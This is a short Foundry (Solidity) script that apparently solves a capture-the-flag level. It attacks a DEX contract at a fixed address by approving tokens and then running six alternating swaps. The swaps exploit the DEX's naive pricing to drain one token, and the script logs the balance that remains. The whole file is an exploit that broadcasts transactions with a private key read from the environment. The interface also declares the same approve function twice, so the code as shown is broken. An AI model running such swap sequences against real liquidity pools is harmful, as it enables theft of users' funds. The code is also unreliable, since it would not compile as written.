// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IDex {
    function swap(address, address , uint ) external;
    function approve(address, uint) external;
    function token1() external returns(address);
    function token2() external returns(address);
    function balanceOf(address, address) external returns(uint);
    function approve(address, uint) external;
}

contract DEX is Script {

    IDex toExploit = IDex(0x96e597249482AfF3f74c90e04b63FaCc33df5c8d);
    function run() external{
        uint256 deployerPrivateKey = vm.envUint("pvt_key");
        vm.startBroadcast(deployerPrivateKey);
        toExploit.approve(address(toExploit), 500);
        address token1 = toExploit.token1();
        address token2 = toExploit.token2();

        toExploit.swap(token1, token2, 10);
        toExploit.swap(token2, token1, 20);
        toExploit.swap(token1, token2, 24);
        toExploit.swap(token2, token1, 30);
        toExploit.swap(token1, token2, 41);
        toExploit.swap(token2, token1, 45);

        console.log("Final token1 balance of Dex is : ", toExploit.balanceOf(token1, address(toExploit)));
        vm.stopBroadcast();
    }
}